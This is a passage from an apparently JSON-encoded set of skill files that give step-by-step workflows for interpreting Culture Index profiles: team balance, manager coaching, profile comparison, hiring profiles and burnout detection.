recommendations depend on business stage and function.*\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/analyze-team.md": "<required_reading>\n\n**Read these reference files before analyzing:**\n1. `references/team-composition.md` - Gas/Brake/Glue framework\n2. `references/patterns-archetypes.md` - Pattern identification\n\n</required_reading>\n\n<process>\n\n**Step 1: Load All Team Profiles**\n\nGather profiles for all team members. For each person, you need:\n- Name\n- Pattern/Archetype\n- Trait distances from arrow (A, B, C, D)\n- EU values (Survey and Job)\n\n**Step 2: Categorize Gas/Brake/Glue**\n\nFor each team member, identify their primary role:\n\n| Role | Trait | Who Qualifies |\n|------|-------|---------------|\n| **Gas** | High A (right of arrow) | Drives growth, takes risks, initiates |\n| **Brake** | High D (right of arrow) | Controls quality, manages risk, finishes |\n| **Glue** | High B (right of arrow) | Builds culture, maintains morale, connects |\n\nCreate a team roster:\n\n| Name | Pattern | Primary Role | Secondary Role |\n|------|---------|--------------|----------------|\n| ? | ? | Gas/Brake/Glue | ? |\n\n**Step 3: Assess Balance**\n\nCount roles:\n- Gas (High A): [X] people\n- Brake (High D): [X] people\n- Glue (High B): [X] people\n\n**Balance indicators:**\n\n| Symptom | Likely Gap |\n|---------|------------|\n| Lacking growth, decisive action, strategic problem-solving | Not enough Gas (High A) |\n| Morale issues, root canal culture, no fun | Not enough Glue (High B) |\n| Quality erosion, mistakes, compliance issues | Not enough Brake (High D) |\n| Chaos, recklessness, burnout | Too much Gas, not enough Brake |\n| Paralysis, perfectionism, can't ship | Too much Brake, not enough Gas |\n| All talk, no action, groupthink | Too much Glue, not enough Gas |\n\n**Step 4: Consider Business Season**\n\nThe ideal balance depends on what the team/company needs now:\n\n| Season | Priority | Emphasis |\n|--------|----------|----------|\n| High-growth / Turnaround | Gas | Need drivers and risk-takers |\n| Consolidation / Stability | Brake | Need quality and consistency |\n| Culture Building | Glue | Need relationship builders |\n| Complex Operations | Brake + Glue | Need precision and collaboration |\n\n**Step 5: Identify Gaps**\n\nBased on balance assessment:\n\n```\nCurrent State:\n- Gas: [X] (sufficient/insufficient)\n- Brake: [X] (sufficient/insufficient)\n- Glue: [X] (sufficient/insufficient)\n\nGap Analysis:\n- [Gap 1]: [Description and impact]\n- [Gap 2]: [Description and impact]\n```\n\n**Step 6: Check C Trait Distribution**\n\nC (Pace/Patience) affects team dynamics:\n\n| Pattern | Implication |\n|---------|-------------|\n| Mostly Low C | Fast-moving, urgent, may create chaos |\n| Mostly High C | Steady, patient, may resist change |\n| Mixed C | Natural tension between fast and slow |\n\nIf major projects require urgent pivots  need some Low C.\nIf major projects require sustained focus  need some High C.\n\n**Step 7: Review A vs B Balance**\n\nTeam-wide task vs people orientation:\n\n| Pattern | Implication |\n|---------|-------------|\n| A > B (most people) | Task-focused, results-driven, may neglect relationships |\n| B > A (most people) | People-focused, harmonious, may avoid tough decisions |\n| Mixed | Healthy tension, can balance both |\n\n**Step 8: Flag Potential Conflicts**\n\nTrait combinations that create friction:\n\n| Combination | Friction Point |\n|-------------|----------------|\n| High A vs Low A | Independence vs collaboration expectations |\n| High B vs Low B | Social needs mismatch |\n| High C vs Low C | Pace/urgency mismatch |\n| High D vs Low D | Detail orientation mismatch |\n\nIdentify specific pairs who may clash.\n\n**Step 9: Recommend Hires (if gaps exist)**\n\nFor each gap, specify ideal profile:\n\n```\nGap: [Missing role]\nIdeal Hire: [Pattern type]\n- A: [high/low/normative] - [reason]\n- B: [high/low/normative] - [reason]\n- C: [high/low/normative] - [reason]\n- D: [high/low/normative] - [reason]\n```\n\n**Step 10: Compile Team Analysis**\n\n```\n## Team Composition Analysis\n\n### Team Roster\n[Table of members with patterns and roles]\n\n### Balance Assessment\n- Gas (High A): [count] - [assessment]\n- Brake (High D): [count] - [assessment]\n- Glue (High B): [count] - [assessment]\n\n### Current Gaps\n1. [Gap and impact]\n2. [Gap and impact]\n\n### Potential Friction Points\n- [Person A] vs [Person B]: [reason]\n\n### Hiring Recommendations\n1. [Role needed]: [Pattern to seek]\n\n### Team Strengths\n1. [Strength 1]\n2. [Strength 2]\n\n### Watch Areas\n1. [Risk 1]\n2. [Risk 2]\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these team analysis mistakes:\n\n- **Seeking homogeneity**: Teams need diverse profiles, not clones\n- **Over-indexing on Gas**: High A's are hard to manage and may conflict\n- **Ignoring Brake**: Every team needs quality control and follow-through\n- **Neglecting Glue in remote teams**: High B's are critical for culture\n- **Using absolute values**: Always use distance from arrow for A, B, C, D\n\n</anti_patterns>\n\n<success_criteria>\n\nTeam analysis is complete when:\n- [ ] All team members categorized by Gas/Brake/Glue\n- [ ] Balance assessed with specific counts\n- [ ] Business season considered\n- [ ] Gaps identified with impact\n- [ ] C trait distribution reviewed\n- [ ] A vs B balance assessed\n- [ ] Potential conflicts flagged\n- [ ] Hiring recommendations provided (if gaps exist)\n- [ ] Team strengths documented\n- [ ] Watch areas identified\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/coach-manager.md": "<required_reading>\n\n**Read these reference files before coaching:**\n1. `references/primary-traits.md` - A, B, C, D trait details and management approaches\n2. `references/secondary-traits.md` - EU, L, I traits\n3. `references/patterns-archetypes.md` - Pattern identification\n\n</required_reading>\n\n<purpose>\n\nHelp managers work more effectively with their direct reports by comparing Culture Index profiles and providing specific coaching recommendations. This workflow translates trait differences into actionable management adjustments.\n\n</purpose>\n\n<process>\n\n**Step 1: Load Both Profiles**\n\nGather the manager and direct report's profiles:\n\n```\nManager: [Name]\n- Pattern: [Archetype]\n- A: [position relative to arrow]\n- B: [position relative to arrow]\n- C: [position relative to arrow]\n- D: [position relative to arrow]\n- EU Survey/Job: [values]\n\nDirect Report: [Name]\n- Pattern: [Archetype]\n- A: [position relative to arrow]\n- B: [position relative to arrow]\n- C: [position relative to arrow]\n- D: [position relative to arrow]\n- EU Survey/Job: [values]\n```\n\n**Step 2: Calculate Trait Gaps**\n\nFor each trait, calculate the gap between manager and direct report:\n\n| Trait | Manager | Direct Report | Gap | Friction Risk |\n|-------|---------|---------------|-----|---------------|\n| A | [pos] | [pos] | [diff] | [Low/Med/High] |\n| B | [pos] | [pos] | [diff] | [Low/Med/High] |\n| C | [pos] | [pos] | [diff] | [Low/Med/High] |\n| D | [pos] | [pos] | [diff] | [Low/Med/High] |\n\n**Friction risk guide:**\n- Same side of arrow, similar distance: Low friction\n- Same side of arrow, different distance: Medium friction\n- Opposite sides of arrow: High friction potential\n\n**Step 3: Identify Primary Friction Points**\n\nFlag the largest gaps (opposite sides of arrow or >3 centile difference):\n\n| Gap | Manager Tendency | Direct Report Need | Friction Source |\n|-----|------------------|-------------------|-----------------|\n| [Trait] | [behavior] | [behavior] | [conflict] |\n\n**Common friction patterns:**\n\n| Manager | Direct Report | Friction |\n|---------|---------------|----------|\n| High A | Low A | Manager expects initiative; report waits for direction |\n| Low A | High A | Manager collaborates; report acts independently |\n| High B | Low B | Manager wants connection; report wants to work |\n| Low B | High B | Manager skips rapport; report needs relationship first |\n| High C | Low C | Manager methodical; report impatient |\n| Low C | High C | Manager creates urgency; report resists rush |\n| High D | Low D | Manager detail-focused; report big-picture |\n| Low D | High D | Manager flexible; report needs structure |\n\n**Step 4: Generate Communication Adjustments**\n\nBased on direct report's traits, recommend specific adjustments:\n\n**If direct report is High A:**\n- Use bullet points focused on ROI, not paragraphs\n- Give outcomes (\"bake me a cake\"), not step-by-step instructions\n- Ask questions to get buy-in, don't dictate\n- Allow autonomy - avoid micromanagement\n- Be direct and confident - they don't respect hesitation\n\n**If direct report is Low A:**\n- Provide specific direction before expecting action\n- Give frameworks for novel decisions\n- Offer specific praise, not general (\"Great job on X\")\n- Probe for concerns - silence doesn't mean agreement\n- Don't misread helpfulness as ambition\n\n**If direct report is High B:**\n- Allow time for rapport before tasks\n- Verbal praise and public recognition matter\n- Include in social activities\n- Don't isolate with extended solo work\n- Remember: first statement isn't final position (verbal processor)\n\n**If direct report is Low B:**\n- Minimize unnecessary check-ins\n- Use async communication (email) over meetings\n- Private recognition, not public praise\n- Thoughtful gestures over verbal affirmation\n- Don't mistake quiet for disengagement\n\n**If direct report is High C:**\n- Send agendas in advance\n- One topic per meeting\n- Protect their focus time (28-min recovery from interruptions)\n- Provide advance notice of changes\n- Give structured, sequential instructions\n\n**If direct report is Low C:**\n- Put deadlines in subject lines\n- Keep them busy with variety\n- Expect them to interrupt - plan for it\n- Use their urgency productively\n- Don't be surprised by over-commitment\n\n**If direct report is High D:**\n- Frame feedback as process improvement, not personal criticism\n- Provide training/learning opportunities\n- Don't break trust - they have long memories\n- Build SOPs for new responsibilities\n- Recognize their attention to quality\n\n**If direct report is Low D:**\n- Give creative problems to solve\n- Provide options, not mandates\n- Build systems to catch their gaps\n- Focus on the 3 things that matter most\n- Accept 80% completion; assign finishers\n\n**Step 5: Design 1:1 Structure**\n\nBased on trait comparison, recommend 1:1 format:\n\n**Frequency:**\n- Low A direct report: More frequent (weekly)\n- High A direct report: Less frequent (bi-weekly or as needed)\n- High C direct report: Consistent schedule, same time/day\n- Low C direct report: Flexible timing, short check-ins ok\n\n**Duration:**\n- High B direct report: Allow buffer for rapport\n- Low B direct report: Keep focused and efficient\n- High C direct report: Single-topic, predictable length\n- Low C direct report: Can be shorter, faster-paced\n\n**Format:**\n- High D direct report: Structured agenda, action items\n- Low D direct report: Flexible, allow tangents\n- High B direct report: Start with personal connection\n- Low B direct report: Start with business\n\n**Sample 1:1 template for [Direct Report's Pattern]:**\n```\n1. [Opening based on B trait]\n2. [Agenda item structure based on C/D traits]\n3. [Feedback approach based on A trait]\n4. [Closing/action items based on D trait]\n```\n\n**Step 6: Identify Motivators**\n\nBased on direct report's profile, their primary motivators are:\n\n| Trait Position | Motivator | Implementation |\n|----------------|-----------|----------------|\n| High A | Autonomy, ROI, winning | Give ownership, variable comp |\n| Low A | Clear direction, team success | Specific praise, stable comp |\n| High B | Acceptance, inclusion | Verbal praise, team activities |\n| Low B | Privacy, focus time | Leave alone, private recognition |\n| High C | Stability, predictability | Consistent routines, advance notice |\n| Low C | Variety, deadlines | Keep busy, clear deadlines |\n| High D | Knowledge, trust | Training, recognition for quality |\n| Low D | Freedom, options | Creative problems, flexibility |\n\n**Step 7: Flag Energy Concerns**\n\nCheck EU utilization:\n- Survey EU: [value]\n- Job EU: [value]\n- Utilization: [Job/Survey  100]%\n\n| Utilization | Status | Action |\n|-------------|--------|--------|\n| 70-130% | Healthy | Maintain current approach |\n| <70% | Frustration | Address mismatch - discuss role engagement |\n| >130% | Stress | Direct report is overextending |\n\n**Step 8: Compile Coaching Summary**\n\n```markdown\n## Manager Coaching Guide: [Manager]  [Direct Report]\n\n**Date:** [Date]\n**Manager Pattern:** [Archetype]\n**Direct Report Pattern:** [Archetype]\n\n### Key Trait Gaps\n| Trait | Gap | Adjustment Needed |\n|-------|-----|-------------------|\n| [Trait] | [difference] | [specific adjustment] |\n\n### Communication Style Adjustments\n1. [Specific adjustment based on their traits]\n2. [Specific adjustment based on their traits]\n3. [Specific adjustment based on their traits]\n\n### 1:1 Recommendations\n- **Frequency:** [recommendation]\n- **Duration:** [recommendation]\n- **Format:** [recommendation]\n- **Opening:** [how to start based on B trait]\n- **Feedback:** [how to deliver based on A/D traits]\n\n### Primary Motivators\n1. [Motivator 1] - [how to implement]\n2. [Motivator 2] - [how to implement]\n\n### Watch Areas\n- [Potential friction point 1]\n- [Potential friction point 2]\n\n### Energy Status\n- EU Utilization: [percentage]\n- Status: [Healthy/Watch/Concern/Stress]\n- Action: [if any]\n\n### Things to Avoid\n- [Anti-pattern for this direct report]\n- [Anti-pattern for this direct report]\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these coaching mistakes:\n\n- **Expecting them to change**: Survey traits are hardwired - change the environment, not the person\n- **Projecting your motivators**: What motivates you may demotivate them\n- **One-size-fits-all 1:1s**: Adapt format to their profile\n- **Ignoring EU signals**: Low utilization predicts disengagement and flight risk\n- **Treating gaps as problems**: Different profiles bring complementary strengths\n- **Forgetting your own biases**: Your profile affects how you perceive theirs\n\n</anti_patterns>\n\n<success_criteria>\n\nManager coaching is complete when:\n- [ ] Both profiles loaded and compared\n- [ ] All trait gaps calculated with friction risk\n- [ ] Primary friction points identified\n- [ ] Communication adjustments specified for each major trait\n- [ ] 1:1 structure designed for their profile\n- [ ] Motivators identified with implementation suggestions\n- [ ] EU utilization checked and flagged if concerning\n- [ ] Watch areas documented\n- [ ] Anti-patterns for this pairing noted\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/compare-profiles.md": "<required_reading>\n\n**Read these reference files before comparing:**\n1. `references/primary-traits.md` - Trait details\n2. `references/secondary-traits.md` - L and I interpretation\n\n</required_reading>\n\n<process>\n\n**Step 1: Load Both Profiles**\n\nFor each person, record:\n- Name\n- Pattern/Archetype\n- Arrow position\n- All trait distances from arrow (A, B, C, D)\n- L and I absolute values\n- EU values\n\n**Step 2: Create Comparison Table**\n\n| Trait | Person A Distance | Person B Distance | Difference | Notes |\n|-------|-------------------|-------------------|------------|-------|\n| A | +/- X from arrow | +/- X from arrow | | |\n| B | +/- X from arrow | +/- X from arrow | | |\n| C | +/- X from arrow | +/- X from arrow | | |\n| D | +/- X from arrow | +/- X from arrow | | |\n| L | [absolute] | [absolute] | | |\n| I | [absolute] | [absolute] | | |\n\n**Remember**: Compare DISTANCES from arrow, not absolute values (except L and I).\n\n**Step 3: Identify Similar Traits**\n\nTraits where both people fall on the same side of their arrow (both high or both low):\n\n- [Trait]: Both high/low - [implication]\n\nSimilarity creates:\n- Shared understanding\n- Similar communication style\n- Potential blind spots (both miss same things)\n\n**Step 4: Identify Opposite Traits**\n\nTraits where people fall on opposite sides of their arrows:\n\n- [Trait]: Person A high, Person B low - [implication]\n\nOpposites create:\n- Potential friction\n- Complementary strengths (if managed well)\n- Need for intentional bridging\n\n**Step 5: Assess Major Friction Points**\n\n| Combination | Friction | Mitigation |\n|-------------|----------|------------|\n| High A vs Low A | Independence expectations clash | High A gives direction, respects Low A's collaborative needs |\n| High B vs Low B | Social needs mismatch | High B allows Low B alone time; Low B tolerates some small talk |\n| High C vs Low C | Pace mismatch | Low C respects High C's focus time; High C accepts some urgency |\n| High D vs Low D | Detail orientation clash | High D accepts \"good enough\"; Low D follows through on commitments |\n\nDocument specific friction points for this pair.\n\n**Step 6: Assess Communication Compatibility**\n\n| Person A | Person B | Communication Challenge |\n|----------|----------|-------------------------|\n| High A | Low A | High A may steamroll; Low A may not push back |\n| High B | Low B | High B needs verbal processing; Low B prefers written |\n| High C | Low C | High C needs advance notice; Low C creates urgency |\n| High D | Low D | High D wants specifics; Low D gives big picture |\n\n**Step 7: Compare L (Logic) and I (Ingenuity)**\n\nThese use absolute values - direct comparison is valid.\n\n**Logic comparison:**\n| Person A Logic | Person B Logic | Dynamic |\n|----------------|----------------|---------|\n| Both High (8-10) | Both High (8-10) | Rational discussions, may seem cold to others |\n| Both Low (0-2) | Both Low (0-2) | Emotional connection, may escalate together |\n| One High, One Low | - | Potential misunderstanding; High L may dismiss Low L's concerns |\n\n**Ingenuity comparison:**\n| Person A Ingenuity | Person B Ingenuity | Dynamic |\n|--------------------|-------------------|---------|\n| Both High (7-10) | Both High (7-10) | Creative brainstorming, may lack grounding |\n| Both Low (0-2) | Both Low (0-2) | Practical focus, may miss innovative solutions |\n| One High, One Low | - | High I may frustrate Low I with abstract ideas |\n\n**Step 8: Identify Complementary Strengths**\n\nWhere opposites create value:\n\n- Person A brings [trait/strength], Person B brings [trait/strength]\n- Together they cover [gap that neither would alone]\n\nExample:\n- High A (Person A) + High D (Person B) = \"A starts, D finishes\"\n- High B (Person A) + Low B (Person B) = \"One builds relationships, one does deep work\"\n\n**Step 9: Leadership/Collaboration Dynamics**\n\nIf one person leads the other:\n\n| Leader Trait | Follower Trait | Dynamic |\n|--------------|----------------|---------|\n| High A leading Low A | Works well if High A provides direction |\n| Low A leading High A | High A may not respect, may take over |\n| High D leading Low D | Low D may feel micromanaged |\n| Low D leading High D | High D may feel unsupported |\n\n**Step 10: Compile Comparison Summary**\n\n```\n## Profile Comparison: [Person A] vs [Person B]\n\n### Quick View\n| | Person A | Person B |\n|---|----------|----------|\n| Pattern | [Archetype] | [Archetype] |\n| Primary Driver | [Leading trait] | [Leading trait] |\n| Logic | [X] | [X] |\n| Ingenuity | [X] | [X] |\n\n### Trait Comparison (Relative to Arrow)\n| Trait | Person A | Person B | Alignment |\n|-------|----------|----------|-----------|\n| A | +/- X | +/- X | Same/Opposite |\n| B | +/- X | +/- X | Same/Opposite |\n| C | +/- X | +/- X | Same/Opposite |\n| D | +/- X | +/- X | Same/Opposite |\n\n### Similarities\n- [Shared trait 1]: [Implication]\n- [Shared trait 2]: [Implication]\n\n### Differences\n- [Opposite trait 1]: [Friction risk and opportunity]\n- [Opposite trait 2]: [Friction risk and opportunity]\n\n### Friction Points\n1. [Specific friction]: [Mitigation strategy]\n2. [Specific friction]: [Mitigation strategy]\n\n### Complementary Strengths\n1. [How they complement each other]\n2. [What they cover together]\n\n### Communication Recommendations\n- Person A should: [Specific advice]\n- Person B should: [Specific advice]\n\n### Collaboration Forecast\n[Overall assessment: Natural fit / Workable with effort / High friction / Complementary opposites]\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these comparison mistakes:\n\n- **Comparing absolute values**: \"Person A has a 7, Person B has a 4\" is meaningless\n- **Assuming same = better**: Opposite traits often create complementary value\n- **Ignoring context**: Collaboration needs depend on the work being done\n- **Overlooking L and I**: These ARE comparable directly and affect dynamics\n- **Binary thinking**: It's not \"compatible\" or \"incompatible\" - it's about managing dynamics\n\n</anti_patterns>\n\n<success_criteria>\n\nProfile comparison is complete when:\n- [ ] Both profiles loaded with arrow positions\n- [ ] All traits compared using relative distances\n- [ ] Similarities identified with implications\n- [ ] Differences identified with friction risks\n- [ ] L and I compared directly\n- [ ] Complementary strengths noted\n- [ ] Communication recommendations provided\n- [ ] Collaboration forecast given\n- [ ] No absolute value comparisons used (except L and I)\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/define-hiring-profile.md": "<required_reading>\n\n**Read these reference files before defining a hiring profile:**\n1. `references/patterns-archetypes.md` - Pattern identification and role-fit questions\n2. `references/primary-traits.md` - A, B, C, D trait details\n\n</required_reading>\n\n<purpose>\n\nDefine the ideal Culture Index profile for a role you're hiring. This workflow helps translate job requirements into specific trait positions, identify acceptable patterns, and flag red flags.\n\n</purpose>\n\n<process>\n\n**Step 1: Gather Role Context**\n\nCollect information about the position:\n\n```\nRole: [Title]\nReports To: [Manager's pattern if known]\nTeam Context: [Existing team profiles if available]\nBusiness Stage: [Growth / Consolidation / Turnaround / Stability]\n```\n\n**Step 2: Answer Role-Fit Questions**\n\nThese three questions determine primary trait positions:\n\n| Question | Answer | Implication |\n|----------|--------|-------------|\n| Is this role more **macro** or **micro**? | Macro  High A | Micro  Low A |\n| Is this position more about **people** or **problems**? | People  High B | Problems  Low B |\n| How much **repetition** is in this role? | High repetition  High C | Low repetition  Low C |\n\n**Record your answers:**\n- Macro/Micro: [answer]  A should be [High/Low/Normative]\n- People/Problems: [answer]  B should be [High/Low/Normative]\n- Repetition level: [answer]  C should be [High/Low/Normative]\n\n**Step 3: Determine D Trait (Conformity)**\n\nAsk additional questions:\n\n| Question | If Yes | If No |\n|----------|--------|-------|\n| Does this role require strict adherence to process? | High D | Low D |\n| Are details and precision critical to success? | High D | Low D |\n| Will quality failures have significant consequences? | High D | Low D |\n| Does the role require creative rule-breaking? | Low D | - |\n| Must they challenge status quo to succeed? | Low D | - |\n\n**Record:** D should be [High/Low/Normative]\n\n**Step 4: Map to Ideal Pattern**\n\nUsing your answers from Steps 2-3, identify the ideal pattern:\n\n| Role Profile | Trait Combination | Example Roles |\n|--------------|-------------------|---------------|\n| **Visionary/Architect** | High A, Low C, Low D | CEO, Founder, Strategy Lead |\n| **Rainmaker/Persuader** | High A, High B, Low C | Sales, BD, Account Executive |\n| **Scholar/Specialist** | Low B, High C, High D | Engineer, Analyst, Researcher |\n| **Technical Expert** | Low A, Low B, Low C, High D | Security, QC, Operations |\n| **Craftsman** | Low A, Low B, High C, High D | Finance, Compliance, Audit |\n| **Accommodator** | Low A, High B, High C | HR, Customer Success, Support |\n| **Philosopher** | High A, Low B, High C | Strategy, Research |\n\n**Your ideal pattern:** [Pattern name]\n\n**Step 5: Define Acceptable Range**\n\nNot every hire will be a perfect match. Define acceptable variance:\n\n| Trait | Ideal | Acceptable Range | Hard No |\n|-------|-------|------------------|---------|\n| A | [High/Low/Norm] | [range] | [extremes to avoid] |\n| B | [High/Low/Norm] | [range] | [extremes to avoid] |\n| C | [High/Low/Norm] | [range] | [extremes to avoid] |\n| D | [High/Low/Norm] | [range] | [extremes to avoid] |\n\n**Guidance for ranges:**\n- \"Must have\": 1 centile from ideal\n- \"Strongly prefer\": 2 centiles from ideal\n- \"Acceptable\": 3 centiles from ideal\n- \"Hard no\": Beyond 4 centiles\n\n**Step 6: Consider L and I**\n\nLogic (L) and Ingenuity (I) use absolute values:\n\n| Question | If Yes | If No |\n|----------|--------|-------|\n| Does this role require detached, analytical decision-making? | High L (7-10) | - |\n| Does this role require empathy and emotional intelligence? | Low L (0-3) | - |\n| Does this role require novel problem-solving and innovation? | High I (7-10) | - |\n| Does this role benefit from proven methods over invention? | Low I (0-3) | - |\n\n**Record:**\n- L: [range or \"any\"]\n- I: [range or \"any\"]\n\n**Step 7: Identify Role-Specific Red Flags**\n\nBased on role requirements, flag patterns that would struggle:\n\n| If the role requires... | Red flag pattern | Why |\n|-------------------------|------------------|-----|\n| Independent decision-making | Very Low A | Needs direction, avoids decisions |\n| Customer interaction | Very Low B | May seem cold or disengaged |\n| Steady, predictable work | Very Low C | Creates unnecessary urgency |\n| Precision and accuracy | Very Low D | Misses details, inconsistent |\n| Quick pivots | Very High C | Resists change, slow to adapt |\n| Creative solutions | Very High D | Rigid adherence to process |\n| Collaboration | Very High A | \"Me first,\" dismissive of others |\n\n**Your red flags:**\n1. [Pattern/trait that would fail in this role]\n2. [Pattern/trait that would fail in this role]\n\n**Step 8: Consider Team Dynamics**\n\nIf team profiles are available:\n\n| Current Team Gap | Hire For |\n|------------------|----------|\n| No High A (lacking \"Gas\") | Consider High A |\n| No High B (lacking \"Glue\") | Consider High B |\n| No High D (lacking \"Brake\") | Consider High D |\n| All same pattern | Add diversity |\n| Existing friction | Avoid intensifying |\n\n**Team consideration notes:** [observations]\n\n**Step 9: Generate Hiring Profile**\n\nCompile the complete hiring profile:\n\n```markdown\n## Hiring Profile: [Role Title]\n\n**Date Created:** [Date]\n**Created By:** [Name]\n\n### Role Context\n- Reports to: [Manager pattern if known]\n- Team: [Team composition summary]\n- Business stage: [Growth/Consolidation/etc.]\n\n### Ideal Profile\n\n| Trait | Position | Confidence | Notes |\n|-------|----------|------------|-------|\n| A (Autonomy) | [High/Low/Norm] | [H/M/L] | [reason] |\n| B (Social) | [High/Low/Norm] | [H/M/L] | [reason] |\n| C (Pace) | [High/Low/Norm] | [H/M/L] | [reason] |\n| D (Conformity) | [High/Low/Norm] | [H/M/L] | [reason] |\n| L (Logic) | [range or any] | [H/M/L] | [reason] |\n| I (Ingenuity) | [range or any] | [H/M/L] | [reason] |\n\n**Target Pattern:** [Pattern name]\n\n### Acceptable Alternatives\n- [Alternative pattern 1] - [why acceptable]\n- [Alternative pattern 2] - [why acceptable]\n\n### Red Flags (Do Not Hire)\n1. [Pattern/trait] - [why problematic for this role]\n2. [Pattern/trait] - [why problematic for this role]\n\n### Interview Focus Areas\nBased on the ideal profile, explore these areas in interviews:\n- [Area 1 based on required traits]\n- [Area 2 based on required traits]\n\n### Using This Profile\n\n**With predicted traits (from interview transcript):**\n- Compare predicted profile to this template\n- Note areas of alignment and concern\n- Flag any red flag traits in predicted profile\n\n**With actual CI survey (after offer signed):**\n- Compare actual survey to predictions\n- Assess fit against this profile\n- Identify onboarding considerations based on gaps\n```\n\n</process>\n\n<anti_patterns>\n\nAvoid these hiring profile mistakes:\n\n- **Over-specifying**: Requiring exact positions reduces candidate pool unnecessarily\n- **Cloning existing team**: Different patterns bring valuable perspectives\n- **Ignoring business stage**: Growth needs Gas, consolidation needs Brake\n- **Using CI as sole filter**: Profile is one input, not the complete picture\n- **Treating traits as skills**: CI measures drives, not capabilities\n- **Dismissing normative traits**: Flexibility can be a strength\n\n</anti_patterns>\n\n<success_criteria>\n\nHiring profile is complete when:\n- [ ] Role context documented (reporting, team, stage)\n- [ ] All three role-fit questions answered\n- [ ] D trait determined with rationale\n- [ ] Ideal pattern identified\n- [ ] Acceptable ranges defined for all traits\n- [ ] L and I requirements specified (or marked as \"any\")\n- [ ] Red flags identified with explanations\n- [ ] Team dynamics considered (if team data available)\n- [ ] Interview focus areas identified\n- [ ] Profile formatted for use in hiring process\n\n</success_criteria>\n",
        "plugins/culture-index/skills/interpreting-culture-index/workflows/detect-burnout.md": "<required_reading>\n\n**Read these reference files before analyzing:**\n1. `references/primary-traits.md` - Understanding trait movement\n2. `references/anti-patterns.md` - Burnout warning signs\n\n</required_reading>\n\n<process>\n\n**Step 1: Load Both Charts**\n\nYou need both Survey (top) and Job (bottom) graphs for burnout detection.\n\nRecord for each chart:\n- Arrow position\n- All trait values (A, B, C, D, L, I)\n- EU value\n\n**Step 2: Calculate Energy Utilization**\n\n```\nUtilization = (Job EU / Survey EU)  100\n```\n\n| Utilization | Status | Interpretation |\n|-------------|--------|----------------|\n| 70-130% | Healthy | Sustainable workload |\n| >130% | **STRESS** | Overutilization, burnout risk |\n| <70% | **FRUSTRATION** | Underutilization, flight risk |\n\n**Example**: Survey EU = 41, Job EU = 54  54/41 = 132%  STRESS\n\n**Step 3: Compare Arrow Movement**\n\n| Arrow Direction (Survey  Job) | Signal | Meaning |\n|--------------------------------|--------|---------|\n| Arrow shifts RIGHT | STRESS | Pushing harder than natural |\n| Arrow shifts LEFT | FRUSTRATION | Pulling back, disengaging |\n| Arrow position unchanged | Stable | Environment matches expectations |\n\n**Step 4: Analyze Each Trait's Movement**\n\nFor each trait, compare Survey position to Job position:\n\n| Trait | Survey | Job | Movement | Signal |\n|-------|--------|-----|----------|--------|\n| A | ? | ? | +/- ? | ? |\n| B | ? | ? | +/- ? | ? |\n| C | ? | ? | +/- ? | ? |\n| D | ? | ? | +/- ? | ? |\n| L | ? | ? | +/- ? | ? |\n| I | ? | ? | +/- ? | ? |\n\n**Movement interpretation:**\n\n| Trait | Raising | Dropping |\n|-------|---------|----------|\n| A | Needs to drive/lead more (may be self-induced or required) | Being held back (\"Who/what is blocking you?\") |\n| B | Role requires more relationship building | Role isolates them (demotivating if naturally high B) |\n| C | More focus/patience required than comfortable | More urgency/variety required than comfortable |\n| D | Expected to be more perfectionist/accountable | Role allows more flexibility |\n| L | Trying to be more emotional/open | Compartmentalizing emotions at work |\n| I | Trying to be more inventive (traditional approach not working) | Focusing on practical execution |\n\n**Step 5: Identify Polarizing Shifts**\n\n**Critical flag**: When a dot moves from one side of the norm to the other.\n\nExample: D moves from 2nd percentile (left) to 91st percentile (right)\n- This is drastic behavior modification\n- Almost certainly not sustainable\n\nDocument any polarizing shifts:\n- [Trait]: Moved from [side] to [opposite side]\n- Severity: [moderate/severe]\n\n**Step 6: Check for \"Opposite Pattern\" Warning**\n\n**Imminent flight risk signal**: When someone's Job behaviors show the opposite of their Survey traits.\n\nExample: Architect (High A, Low C, Low D)  Socializer (Low A, High B, High C) in job\n- All dots flipped to opposite side\n- This person is in severe stress\n- Something must change or they will leave\n\n**Step 7: Identify Stress Sources**\n\nJob behaviors reflect perception of what the role requires. Sources:\n1. **Their leader** - Manager expectations/communication\n2. **The work itself** - Actual responsibilities\n3. **Coworkers** - People they work with\n\nAsk: \"Why do they perceive they need to behave this way?\"\n\n**Step 8: Calculate 3-6 Month Risk**\n\nIf behavior modification continues 3-6+ months, expect:\n- Burnout and stress\n- Disengagement\n- Low morale\n- \"Mailing it in\" (70% effort when capable of 100%)\n\nAssess: How long has this modification been sustained?\n\n**Step 9: Check D Trait Specifically**\n\nD movement is the most common stress indicator:\n\n| D Movement | Signal |\n|------------|--------|\n| Raising D significantly | Expected to be more perfectionist/accountable than natural |\n| D \"polarizing\" (low to high) | Most common source of unsustainable stress |\n\n**Step 10: Compile Burnout Assessment**\n\n```\n## Burnout Risk Assessment: [Name]\n\n### Energy Utilization\n- Survey EU: [X]\n- Job EU: [X]\n- Utilization: [X]%\n- Status: [HEALTHY / STRESS / FRUSTRATION]\n\n### Arrow Movement\n- Survey arrow: [X]\n- Job arrow: [X]\n- Direction: [Right=Stress / Left=Frustration / Stable]\n\n### Trait Movement Summary\n| Trait | Survey | Job | Change | Concern Level |\n|-------|--------|-----|--------|---------------|\n| A | | | | Low/Medium/High |\n| B | | | | Low/Medium/High |\n| C | | | | Low/Medium/High |\n| D | | | | Low/Medium/High |\n\n### Polarizing Shifts\n- [Any traits that flipped sides]\n\n### Risk Level: [LOW / MODERATE / HIGH / CRITICAL]\n\n### Stress Sources (Likely)\n1. [Source 1]\n2. [Source 2]\n\n### Recommended Actions\n1. [Action 1 - e.g., \"Discuss workload with manager\"]\n2. [Action 2 - e.g., \"Resurvey in 3 months\"]\n3. [Action 3 - e.g., \"Consider role adjustment\"]\n\n### Timeline\n- Current duration estimate: [X months]\n- Risk horizon: [When burnout likely if unchanged]\n```\n\n</process>\n\n<stress_types>\n\n**>130% (STRESS) has two types:**\n\n1. **Good stress (self-induced)**: \"I love this company, I care deeply\"\n   - Still burnout risk if sustained\n   - Health issues possible after 3-6 months\n\n2. **Bad stress (overutilization)**: Too much work OR work requires too much behavior modification\n   - More urgent intervention needed\n   - May need workload or role 